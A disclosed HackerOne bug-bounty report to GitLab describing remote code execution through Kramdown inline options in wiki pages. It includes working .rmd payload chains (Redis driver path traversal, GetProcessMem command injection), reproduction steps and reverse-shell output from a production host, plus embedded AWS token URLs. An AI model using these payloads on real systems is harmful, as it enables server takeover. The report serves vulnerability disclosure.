{"id":1125425,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTI1NDI1","url":"https://hackerone.com/reports/1125425","title":"RCE via unsafe inline Kramdown options when rendering certain Wiki pages","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2021-03-14T13:38:23.577Z","submitted_at":"2021-03-14T13:38:23.678Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"vakzz","url":"/vakzz","profile_picture_urls":{"small":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/6zbovkumst7oljmo9v21pig3yh9j/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c?response-content-disposition=inline%3B%20filename%3D%2294971b5a75a669ea52903c09fc847f3434930258211181557be06162f5a8bac0.jpg%22%3B%20filename%2A%3DUTF-8%27%2794971b5a75a669ea52903c09fc847f3434930258211181557be06162f5a8bac0.jpg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWRDWPEXO%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132618Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJHMEUCIQDdpfP9zaQzdootuAesQcyxQfGfhPxZKuX1i7ijKLAzlAIgL5my807PEusr0VkqeU29XvZtEmCSLbM%2F7eKmnAELK9MqgwQI7v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDLFQh%2Fbvd7dUg1KFQyrXA%2Fp%2FVtjehJVp7DZYy5u7sRWqZAssugTjxjLMX9n3LuBamcp6G%2Bwyw1kdH5Fc0oMbmVnKCYku75m349ci99IeZGYssnHPQFOGi3KPZcYmBTpCSWJYXklFmUzTDVSnxhcahSThqLhsURXVfnsh6wXSKZz6MsS7fD7HYiuK725Q%2F6sDk7h3pCuB5fUOqyZvOi6e%2FdSM5nyuKqUFkte%2F6i0uholiPHuOhv3puwk%2FK6F%2FiNA6QbCLyZcsFIj5wNcphNxGCbAX8GNv59qxPkBv7zU5QMZhaSRKnyFLoxSNWLKFqeO4qdN%2FgRbEF2RLvY5V1AD1BbElezpO2DYcV6sIiHwCYBPAVtJWc0Oep1T8Sx%2FIWEFxpRS%2B4EQR6%2BcQhrIR2caxSjEaPr13FV3IBlGYyL4TqPiwhW8W9gb3y9c3v7PIUkqs8IYIlAbA%2BK0arNEJfKBmrpxI03L5MtPD0eO6pxGJ9DvZkCWVCaXiTO6oSen4PpDOLghYHo%2B4Vpqvo3%2FpROjCxToAEvdKcvazzutHXo%2FsJlsjoo%2Fmx%2B1Ek92%2BufvnULE1KShcl4rj7BNA4T9Jjuo0ja%2BLxer65UO9tkrad6HgKA9hXXtyDBrlAmhTDWFKsmcmq2ihTQ7PrDCl4pCLBjqlAVM272WWPnlOeGyGQ9vB3AQrwELsHDPU0KiSwP4QYEOtuC3iFTxC%2FXRs42S51Jb7aTjsW4m6tY2xevuwO4tmkEyWJnLxLHRvktGKLmigB4rFLjusFml2FTXw5xWvfY786%2F8KQpyklyKdvZKCIlTGk1BlxxAAC17iJ1VlZV%2BzWSY7WJd1%2Fhm%2BXXw9P5X6Ch%2Fx17cYnn0uAeICgpjy1lOaC5Wkd0STsQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=522bdf11cfc49af253f0e27a876edc5394671b9609e65e4e9b5bd6ac237ea7ec"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":264,"url":"https://hackerone.com/gitlab","handle":"gitlab","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"GitLab","twitter_handle":"gitlab","website":"https://about.gitlab.com","about":"A single application for the entire software development lifecycle."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2021-04-20T17:35:23.805Z","bug_reporter_agreed_on_going_public_at":"2021-04-16T19:27:49.027Z","team_member_agreed_on_going_public_at":"2021-04-20T17:35:23.645Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"### Summary\n\nWhen rendering wiki content with certain extensions such as `.rmd`,  `render_wiki_content` will call [`other_markup_unsafe`](https://gitlab.com/gitlab-org/gitlab/-/blob/v13.9.3-ee/app/helpers/markup_helper.rb#L145) which will end up calling `GitHub::Markup.render` from the `github-markup` gem.  Files with any extension can be uploaded by checking out the wiki with git, commiting the files and pushing the changes back.\n\nSince `kramdown` is loaded, this will end up using it for the [markdown parser](https://github.com/github/markup/blob/v1.7.0/lib/github/markup/markdown.rb#L23) by calling `Kramdown::Document.new(content).to_html`\n\nKramdown has a special extension that allows for options to be [set inline](https://kramdown.gettalong.org/options.html), the example they give is: `{::options auto_ids=\"false\" footnote_nr=\"5\" syntax_highlighter_opts=\"{line_numbers: true\\}\" /}`\n\nThe default syntax highlighter is `rouge` which has an option [`formatter`](https://kramdown.gettalong.org/syntax_highlighter/rouge.html) that can be set via `syntax_highlighter_opts` in the inline options. This option gets used by [`formatter_class`](https://github.com/gettalong/kramdown/blob/REL_2_3_0/lib/kramdown/converter/syntax_highlighter/rouge.rb#L73):\n\n```ruby\n  def self.call(converter, text, lang, type, call_opts)\n      opts = options(converter, type)\n      call_opts[:default_lang] = opts[:default_lang]\n      return nil unless lang || opts[:default_lang] || opts[:guess_lang]\n\n      lexer = ::Rouge::Lexer.find_fancy(lang || opts[:default_lang], text)\n      return nil if opts[:disable] || !lexer || (lexer.tag == \"plaintext\" \u0026\u0026 !opts[:guess_lang])\n\n      opts[:css_class] ||= 'highlight' # For backward compatibility when using Rouge 2.0\n      formatter = formatter_class(opts).new(opts)\n      formatter.format(lexer.lex(text))\n    end\n\n  def self.formatter_class(opts = {})\n      puts \"formatter\"\n      puts opts[:formatter]\n      case formatter = opts[:formatter]\n      when Class\n        formatter\n      when /\\A[[:upper:]][[:alnum:]_]*\\z/\n        ::Rouge::Formatters.const_get(formatter)\n      else\n        # Available in Rouge 2.0 or later\n        ::Rouge::Formatters::HTMLLegacy\n      end\n    rescue NameError\n      # Fallback to Rouge 1.x\n      ::Rouge::Formatters::HTML\n    end\n```\n\nSo this a means that `::Rouge::Formatters.const_get(opts[:formatter]).new(opts)` will be called, where `opts` is controllable via the inline options to kramdown, allowing ruby objects to be initialised  so long as the validation of `/\\A[[:upper:]][[:alnum:]_]*\\z/` passes. The validation slightly restricts things, but pretty much any class without a namespace (`::` is not allowed) can be created. For example (the two `~~` should have an extra `~` but it's messing up the h1 formatting so will need to add it):\n\n```markdown\n{::options auto_ids=\"false\" footnote_nr=\"5\" syntax_highlighter=\"rouge\" syntax_highlighter_opts=\"{formatter: CSV, line_numbers: true\\}\" /}\n\n~~ ruby\n    def what?\n      42\n    end\n~~\n```\n\nWill result in a `CSV` object being created and then it will error with `private method 'format' called for #\u003cCSV:0x00007fe4df7e26d0\u003e` as it tries to use this as the formatter.\n\nOne of the loaded classes is gitlab is `Redis` from [redis-rb](https://github.com/redis/redis-rb) which has an option `driver` that is used to load the driver class:\n\nhttps://github.com/redis/redis-rb/blob/v4.1.3/lib/redis/client.rb#L507\n```ruby\n    def _parse_driver(driver)\n      driver = driver.to_s if driver.is_a?(Symbol)\n\n      if driver.kind_of?(String)\n        begin\n          require_relative \"connection/#{driver}\"\n        rescue LoadError, NameError =\u003e e\n          begin\n            require \"connection/#{driver}\"\n          rescue LoadError, NameError =\u003e e\n            raise RuntimeError, \"Cannot load driver #{driver.inspect}: #{e.message}\"\n          end\n        end\n\n        driver = Connection.const_get(driver.capitalize)\n      end\n\n      driver\n    end\n```\n\nAs both `require_relative` and `require` allow for directory traversal, supplying a `driver` option such as `../../../../../../../../../../tmp/a.rb` will cause that file to be evaluated.\n\nOne of the ways to get a file to a known location in gitlab is to attach a file in the description of a snippet. When attaching, a markdown link will be created similar to: `[file.rb](/uploads/-/system/user/1/1cd3e965551892a4c0c1af01ef2f2ad7/file.rb)`. The default `gitlab_rails['uploads_directory']` is `/var/opt/gitlab/gitlab-rails/uploads` meaning the final file location will be `/var/opt/gitlab/gitlab-rails/uploads/-/system/user/1/1cd3e965551892a4c0c1af01ef2f2ad7/file.rb`.\n\nCombining all of of this, we can create the following `.rmd` file to execute our payload (add `~` to both of the `~~`):\n```\n{::options auto_ids=\"false\" footnote_nr=\"5\" syntax_highlighter=\"rouge\" syntax_highlighter_opts=\"{formatter: Redis, driver: ../../../../../../../../../../var/opt/gitlab/gitlab-rails/uploads/-/system/user/1/1cd3e965551892a4c0c1af01ef2f2ad7/file.rb\\}\" /}\n\n~~ ruby\ndef what?\n  42\nend\n~~\n```\n\n### Steps to reproduce\n\n1. Create a new snippet with any title and file\n1. In the description, click `Attach a file` and select the final ruby payload such as:\n    ```ruby\nputs \"hello from ruby\"\n`echo vakzz was here \u003e /tmp/vakzz`\n    ```\n1. Make note of the upload path: `/uploads/-/system/user/1/c4119c5b144037f708ead7295cea4dd0/payload.rb`\n1. Create a new project\n1. Click Wiki and create a default home page\n1. Hit `Clone repository` to get the clone command\n1. Clone the repo `git clone git@gitlab-docker.local:root/proj1.wiki.git` and add the following file `page1.rmd` using the path from above (add `~` to both the the `~~`): \n\n    ```\n{::options syntax_highlighter=\"rouge\" syntax_highlighter_opts=\"{formatter: Redis, driver: ../../../../../../../../../../var/opt/gitlab/gitlab-rails/uploads/-/system/user/1/c4119c5b144037f708ead7295cea4dd0/payload.rb\\}\" /}\n~~ ruby\ndef what?\n  42\nend\n~~\n    ```\n\n1. Push the changes `git add -A . \u0026\u0026 git commit -m \"page1.rmd\" \u0026\u0026 git push`\n1. Refresh the wiki, there should now be `page1 ` of the right hand side\n1. Click and load `page1`\n1. In the gitlab logs you should see something like:\n\n    ```\nwrong constant name ../../../../../../../../../../var/opt/gitlab/gitlab-rails/uploads/-/system/user/1/c4119c5b144037f708ead7295cea4dd0/payload.rb\nlib/gitlab/other_markup.rb:11:in `render'\napp/helpers/markup_helper.rb:280:in `other_markup_unsafe'\napp/helpers/markup_helper.rb:145:in `markup_unsafe'\napp/helpers/markup_helper.rb:130:in `render_wiki_content'\napp/views/shared/wikis/show.html.haml:30\n    ```\n\n1. Looking at `/tmp` you can see that the payload was executed:\n\n    ```bash\nroot@gitlab-docker:~# cat /tmp/vakzz\nvakzz was here\n    ```\n\n### Impact\nAllows any user with push access to a wiki to execute arbitrary ruby code.\n\n### Examples\nExample page using the inline options to change the highlighter from rouge to `minted` - https://gitlab.com/vakzz-h1/kramdown-wiki/-/wikis/page1\n\n### What is the current *bug* behavior?\nInline options can be set when rendering kramdown documents\n\n### What is the expected *correct* behavior?\n`forbidden_inline_options` could be use to disable the dangerous inline options - https://kramdown.gettalong.org/options.html\n\n### Output of checks\n\n#### Results of GitLab environment info\n\n```\nSystem information\nSystem:\nProxy:\t\tno\nCurrent User:\tgit\nUsing RVM:\tno\nRuby Version:\t2.7.2p137\nGem Version:\t3.1.4\nBundler Version:2.1.4\nRake Version:\t13.0.3\nRedis Version:\t6.0.10\nGit Version:\t2.29.0\nSidekiq Version:5.2.9\nGo Version:\tunknown\n\nGitLab information\nVersion:\t13.9.1-ee\nRevision:\t8ae438629fa\nDirectory:\t/opt/gitlab/embedded/service/gitlab-rails\nDB Adapter:\tPostgreSQL\nDB Version:\t12.5\nURL:\t\thttp://gitlab-docker.local\nHTTP Clone URL:\thttp://gitlab-docker.local/some-group/some-project.git\nSSH Clone URL:\tgit@gitlab-docker.local:some-group/some-project.git\nElasticsearch:\tno\nGeo:\t\tno\nUsing LDAP:\tno\nUsing Omniauth:\tyes\nOmniauth Providers:\n\nGitLab Shell\nVersion:\t13.16.1\nRepository storage paths:\n- default: \t/var/opt/gitlab/git-data/repositories\nGitLab Shell path:\t\t/opt/gitlab/embedded/service/gitlab-shell\nGit:\t\t/opt/gitlab/embedded/bin/git\n```\n\n## Impact\n\nAllows any user with push access to a wiki to execute arbitrary ruby code.","bounty_amount":"20000.0","formatted_bounty":"$20,000","weakness":{"id":70,"name":"Code Injection"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":397,"voters":["obsesif","yssk","drvivanco","joaxcar","mr-medi","honoki","jackalpret","zzero","svalkanov","moloshy","and 387 more..."],"severity":{"rating":"critical","author_type":"User"},"structured_scope":{"databaseId":39022,"asset_type":"OTHER","asset_identifier":"Your Own GitLab Instance","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":10988317,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @vakzz,\n\nThank you for submitting this report! We will investigate the issue as soon as\npossible, and should get back within a week.\n\nPlease do not submit your report or ask about its status through additional\nchannels, as this unnecessarily binds resources in the security team.\n\nBest regards,\nGitLab Security Team\n","automated_response":true,"created_at":"2021-03-14T14:07:07.663Z","updated_at":"2021-03-14T14:07:07.663Z","actor":{"username":"gitlab-securitybot","cleared":false,"url":"/gitlab-securitybot","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":10988492,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hello @vakzz,\n\nThank you for submitting this great report. Are you aware of ways to predict the path of an uploaded file on a GitLab install that uses external object storage?\n\nWe have verified this finding and have escalated to our engineering team.  We will be tracking progress internally at https://gitlab.com/gitlab-org/gitlab/-/issues/324452.  This issue will be made public 30 days following the release of a patch.\n\nGiven the severity of the report, we are paying an initial $1000 on triage. Congratulations!\n\nWe will continue to update you via HackerOne as a patch is scheduled for release.\n\nBest regards,\nDominic\nGitLab Security Team","automated_response":false,"created_at":"2021-03-14T14:53:59.385Z","updated_at":"2021-03-14T14:53:59.385Z","actor":{"username":"dcouture","cleared":false,"url":"/dcouture","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/TpSJ356VRAW7GpCzzZ25R8Kb/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10988495,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2021-03-14T14:54:10.726Z","updated_at":"2021-03-14T14:54:10.726Z","actor":{"url":"/gitlab","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"GitLab"}},"bounty_amount":"1000.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"gitlab","collaborator":{"username":"vakzz","url":"/vakzz"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10988828,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @dcouture,\n\n\u003e Are you aware of ways to predict the path of an uploaded file on a GitLab install that uses external object storage?\n\nI've never used external object store before so will have to set it up and have a look around tomorrow night. Are the git repositories stored on the filesystem even when external object storage is being used?\n\nThere are a few other classes that can be created that seem dangerous such as setting the `cluster` value on `Redis.new`, as well as the Carrierwave helper methods like `remote_avatar_url` on `User.new`. The list of classes is long so will take a while to go through and see if any others are exploitable as well\n\nCheers,\nWill\n\n","automated_response":false,"created_at":"2021-03-14T16:12:44.240Z","updated_at":"2021-03-14T16:12:44.240Z","actor":{"username":"vakzz","cleared":true,"url":"/vakzz","profile_picture_urls":{"medium":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/6zbovkumst7oljmo9v21pig3yh9j/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c?response-content-disposition=inline%3B%20filename%3D%2294971b5a75a669ea52903c09fc847f3434930258211181557be06162f5a8bac0.jpg%22%3B%20filename%2A%3DUTF-8%27%2794971b5a75a669ea52903c09fc847f3434930258211181557be06162f5a8bac0.jpg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWRDWPEXO%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132618Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJHMEUCIQDdpfP9zaQzdootuAesQcyxQfGfhPxZKuX1i7ijKLAzlAIgL5my807PEusr0VkqeU29XvZtEmCSLbM%2F7eKmnAELK9MqgwQI7v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDLFQh%2Fbvd7dUg1KFQyrXA%2Fp%2FVtjehJVp7DZYy5u7sRWqZAssugTjxjLMX9n3LuBamcp6G%2Bwyw1kdH5Fc0oMbmVnKCYku75m349ci99IeZGYssnHPQFOGi3KPZcYmBTpCSWJYXklFmUzTDVSnxhcahSThqLhsURXVfnsh6wXSKZz6MsS7fD7HYiuK725Q%2F6sDk7h3pCuB5fUOqyZvOi6e%2FdSM5nyuKqUFkte%2F6i0uholiPHuOhv3puwk%2FK6F%2FiNA6QbCLyZcsFIj5wNcphNxGCbAX8GNv59qxPkBv7zU5QMZhaSRKnyFLoxSNWLKFqeO4qdN%2FgRbEF2RLvY5V1AD1BbElezpO2DYcV6sIiHwCYBPAVtJWc0Oep1T8Sx%2FIWEFxpRS%2B4EQR6%2BcQhrIR2caxSjEaPr13FV3IBlGYyL4TqPiwhW8W9gb3y9c3v7PIUkqs8IYIlAbA%2BK0arNEJfKBmrpxI03L5MtPD0eO6pxGJ9DvZkCWVCaXiTO6oSen4PpDOLghYHo%2B4Vpqvo3%2FpROjCxToAEvdKcvazzutHXo%2FsJlsjoo%2Fmx%2B1Ek92%2BufvnULE1KShcl4rj7BNA4T9Jjuo0ja%2BLxer65UO9tkrad6HgKA9hXXtyDBrlAmhTDWFKsmcmq2ihTQ7PrDCl4pCLBjqlAVM272WWPnlOeGyGQ9vB3AQrwELsHDPU0KiSwP4QYEOtuC3iFTxC%2FXRs42S51Jb7aTjsW4m6tY2xevuwO4tmkEyWJnLxLHRvktGKLmigB4rFLjusFml2FTXw5xWvfY786%2F8KQpyklyKdvZKCIlTGk1BlxxAAC17iJ1VlZV%2BzWSY7WJd1%2Fhm%2BXXw9P5X6Ch%2Fx17cYnn0uAeICgpjy1lOaC5Wkd0STsQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=ddef48f431abeae9742636487401236aad1a7fd53802d5ea626345398e0002a9"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10988846,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @vakzz,\n\n`git` repositories are stored on disk but on other hosts that shouldn't be visible from where the wiki is rendered. I was mainly trying to figure out if this affected .com, at the moment we think it doesn't (still a critical vulnerability!) but we'll keep investigating.\n\nThanks again,\nDominic\nGitLab Security Team","automated_response":false,"created_at":"2021-03-14T16:16:15.126Z","updated_at":"2021-03-14T16:16:15.126Z","actor":{"username":"dcouture","cleared":false,"url":"/dcouture","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/TpSJ356VRAW7GpCzzZ25R8Kb/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10990926,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @dcouture,\n\nI've managed to chain another gadget that allows for RCE without needing to know a file location.\n\nFirst create a page `load1.rmd` that uses the original redis driver gadget to load the `get_process_mem` gem:\n\n```\n{::options syntax_highlighter=\"rouge\" syntax_highlighter_opts=\"{formatter: Redis, driver: ../get_process_mem\\}\" /}\n\n~~ ruby\n    def what?\n      42\n    end\n~~\n```\n\nThen create another page `load2.rmd` using the `GetProcessMem` class: \n```\n{::options syntax_highlighter=\"rouge\" syntax_highlighter_opts=\"{a: '`echo inject \u003e /tmp/inject`', formatter: GetProcessMem\\}\" /}\n\n~~ ruby\n    def what?\n      42\n    end\n~~\n```\n\nThis will end up calling [`ps_memory`](https://github.com/schneems/get_process_mem/blob/v0.2.5/lib/get_process_mem.rb#L116) which does the following where `pid` is our options hash:\n```ruby\nmem = `ps -o rss= -p #{pid}`\n```\n\nThe hash is converted to a string which allows for trivial command injection in the backticks. Checking on gitlab.com I was able to get a remote shell on `web-30-sv-gprd`:\n\n```\nConnection from [34.74.90.72] port 12345 [tcp/*] accepted (family 2, sport 7281)\n/bin/sh: 0: can't access tty; job control turned off\n$ id\nuid=500(git) gid=500(git) groups=500(git)\n$ hostname -a\nweb-30-sv-gprd\n$ ps auxww\nUSER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nroot         1  0.0  0.0 185344  5912 ?        Ss   Jan27   3:42 /sbin/init\nroot         2  0.0  0.0      0     0 ?        S    Jan27   0:00 [kthreadd]\nroot         4  0.0  0.0      0     0 ?        I\u003c   Jan27   0:00 [kworker/0:0H]\nroot         6  0.0  0.0      0     0 ?        I\u003c   Jan27   0:00 [mm_percpu_wq]\nroot         7  0.0  0.0      0     0 ?        S    Jan27   1:58 [ksoftirqd/0]\nroot         8  0.0  0.0      0     0 ?        I    Jan27  51:24 [rcu_sched]\nroot         9  0.0  0.0      0     0 ?        I    Jan27   0:00 [rcu_bh]\nroot        10  0.0  0.0      0     0 ?        S    Jan27   0:08 [migration/0]\nroot        11  0.0  0.0      0     0 ?        S    Jan27   0:05 [watchdog/0]\nroot        12  0.0  0.0      0     0 ?        S    Jan27   0:00 [cpuhp/0]\nroot        13  0.0  0.0      0     0 ?        S    Jan27   0:00 [cpuhp/1]\nroot        14  0.0  0.0      0     0 ?        S    Jan27   0:05 [watchdog/1]\nroot        15  0.0  0.0      0     0 ?        S    Jan27   0:08 [migration/1]\nroot        16  0.0  0.0      0     0 ?        S    Jan27   1:46 [ksoftirqd/1]\nroot        18  0.0  0.0      0     0 ?        I\u003c   Jan27   0:00 [kworker/1:0H]\nroot        19  0.0  0.0      0     0 ?        S    Jan27   0:00 [cpuhp/2]\nroot        20  0.0  0.0      0     0 ?        S    Jan27   0:05 [watchdog/2]\nroot        21  0.0  0.0      0     0 ?        S    Jan27   0:08 [migration/2]\nroot        22  0.0  0.0      0     0 ?        S    Jan27   1:42 [ksoftirqd/2]\nroot        24  0.0  0.0      0     0 ?        I\u003c   Jan27   0:00 [kworker/2:0H]\nroot        25  0.0  0.0      0     0 ?        S    Jan27   0:00 [cpuhp/3]\nroot        26  0.0  0.0      0     0 ?        S    Jan27   0:05 [watchdog/3]\nroot        27  0.0  0.0      0     0 ?        S    Jan27   0:09 [migration/3]\nroot        28  0.0  0.0      0     0 ?        S    Jan27   1:36 [ksoftirqd/3]\nroot        30  0.0  0.0      0     0 ?        I\u003c   Jan27   0:00 [kworker/3:0H]\nroot        31  0.0  0.0      0     0 ?        S    Jan27   0:00 [cpuhp/4]\nroot        32  0.0  0.0      0     0 ?        S    Jan27   0:05 [watchdog/4]\nroot        33  0.0  0.0      0     0 ?        S    Jan27   0:08 [migration/4]\nroot        34  0.0  0.0      0     0 ?        S    Jan27   1:38 [ksoftirqd/4]\nroot        36  0.0  0.0      0     0 ?        I\u003c   Jan27   0:00 [kworker/4:0H]\nroot        37  0.0  0.0      0     0 ?        S    Jan27   0:00 [cpuhp/5]\nroot        38  0.0  0.0      0     0 ?        S    Jan27   0:05 [watchdog/5]\nroot        39  0.0  0.0      0     0 ?        S    Jan27   0:08 [migration/5]\nroot        40  0.0  0.0      0     0 ?        S    Jan27   1:33 [ksoftirqd/5]\nroot        42  0.0  0.0      0     0 ?        I\u003c   Jan27   0:00 [kworker/5:0H]\nroot        43  0.0  0.0      0     0 ?        S    Jan27   0:00 [cpuhp/6]\nroot        44  0.0  0.0      0     0 ?        S    Jan27   0:05 [watchdog/6]\nroot        45  0.0  0.0      0     0 ?        S    Jan27   0:08 [migration/6]\nroot        46  0.0  0.0      0     0 ?        S    Jan27   1:34 [ksoftirqd/6]\nroot        48  0.0  0.0      0     0 ?        I\u003c   Jan27   0:00 [kworker/6:0H]\nroot        49  0.0  0.0      0     0 ?        S    Jan27   0:00 [cpuhp/7]\nroot        50  0.0  0.0      0     0 ?        S    Jan27   0:05 [watchdog/7]\nroot        51  0.0  0.0      0     0 ?        S    Jan27   0:08 [migration/7]\nroot        52  0.0  0.0      0     0 ?        S    Jan27   1:34 [ksoftirqd/7]\nroot        54  0.0  0.0      0     0 ?        I\u003c   Jan27   0:00 [kworker/7:0H]\nroot        55  0.0  0.0      0     0 ?        S    Jan27   0:00 [cpuhp/8]\nroot        56  0.0  0.0      0     0 ?        S    Jan27   0:05 [watchdog/8]\nroot        57  0.0  0.0      0     0 ?        S    Jan27   0:09 [migration/8]\nroot        58  0.0  0.0      0     0 ?        S    Jan27   1:30 [ksoftirqd/8]\nroot        60  0.0  0.0      0     0 ?        I\u003c   Jan27   0:00 [kworker/8:0H]\nroot        61  0.0  0.0      0     0 ?        S    Jan27   0:00 [cpuhp/9]\nroot        62  0.0  0.0      0     0 ?        S    Jan27   0:05 [watchdog/9]\nroot        63  0.0  0.0      0     0 ?        S    Jan27   0:09 [migration/9]\nroot        64  0.0  0.0      0     0 ?        S    Jan27   1:33 [ksoftirqd/9]\nroot        66  0.0  0.0      0     0 ?        I\u003c   Jan27   0:00 [kworker/9:0H]\nroot        67  0.0  0.0      0     0 ?        S    Jan27   0:00 [cpuhp/10]\nroot        68  0.0  0.0      0     0 ?        S    Jan27   0:05 [watchdog/10]\nroot        69  0.0  0.0      0     0 ?        S    Jan27   0:08 [migration/10]\nroot        70  0.0  0.0      0     0 ?        S    Jan27   1:31 [ksoftirqd/10]\nroot        72  0.0  0.0      0     0 ?        I\u003c   Jan27   0:00 [kworker/10:0H]\nroot        73  0.0  0.0      0     0 ?        S    Jan27   0:00 [cpuhp/11]\nroot        74  0.0  0.0      0     0 ?        S    Jan27   0:05 [watchdog/11]\nroot        75  0.0  0.0      0     0 ?        S    Jan27   0:09 [migration/11]\nroot        76  0.0  0.0      0     0 ?        S    Jan27   1:32 [ksoftirqd/11]\nroot        78  0.0  0.0      0     0 ?        I\u003c   Jan27   0:00 [kworker/11:0H]\nroot        79  0.0  0.0      0     0 ?        S    Jan27   0:00 [cpuhp/12]\nroot        80  0.0  0.0      0     0 ?        S    Jan27   0:05 [watchdog/12]\nroot        81  0.0  0.0      0     0 ?        S    Jan27   0:08 [migration/12]\nroot        82  0.0  0.0      0     0 ?        S    Jan27   1:39 [ksoftirqd/12]\nroot        84  0.0  0.0      0     0 ?        I\u003c   Jan27   0:00 [kworker/12:0H]\nroot        85  0.0  0.0      0     0 ?        S    Jan27   0:00 [cpuhp/13]\nroot        86  0.0  0.0      0     0 ?        S    Jan27   0:05 [watchdog/13]\nroot        87  0.0  0.0      0     0 ?        S    Jan27   0:09 [migration/13]\nroot        88  0.0  0.0      0     0 ?        S    Jan27   1:30 [ksoftirqd/13]\nroot        90  0.0  0.0      0     0 ?        I\u003c   Jan27   0:00 [kworker/13:0H]\nroot        91  0.0  0.0      0     0 ?        S    Jan27   0:00 [cpuhp/14]\nroot        92  0.0  0.0      0     0 ?        S    Jan27   0:05 [watchdog/14]\nroot        93  0.0  0.0      0     0 ?        S    Jan27   0:09 [migration/14]\nroot        94  0.0  0.0      0     0 ?        S    Jan27   1:31 [ksoftirqd/14]\nroot        96  0.0  0.0      0     0 ?        I\u003c   Jan27   0:00 [kworker/14:0H]\nroot        97  0.0  0.0      0     0 ?        S    Jan27   0:00 [cpuhp/15]\nroot        98  0.0  0.0      0     0 ?        S    Jan27   0:05 [watchdog/15]\nroot        99  0.0  0.0      0     0 ?        S    Jan27   0:09 [migration/15]\nroot       100  0.0  0.0      0     0 ?        S    Jan27   1:33 [ksoftirqd/15]\nroot       102  0.0  0.0      0     0 ?        I\u003c   Jan27   0:00 [kworker/15:0H]\nroot       103  0.0  0.0      0     0 ?        S    Jan27   0:00 [kdevtmpfs]\nroot       104  0.0  0.0      0     0 ?        I\u003c   Jan27   0:00 [netns]\nroot       105  0.0  0.0      0     0 ?        S    Jan27   0:00 [rcu_tasks_kthre]\nroot       106  0.0  0.0      0     0 ?        S    Jan27   0:00 [kauditd]\nroot       109  0.0  0.0      0     0 ?        S    Jan27   0:03 [khungtaskd]\nroot       110  0.0  0.0      0     0 ?        S    Jan27   0:00 [oom_reaper]\nroot       111  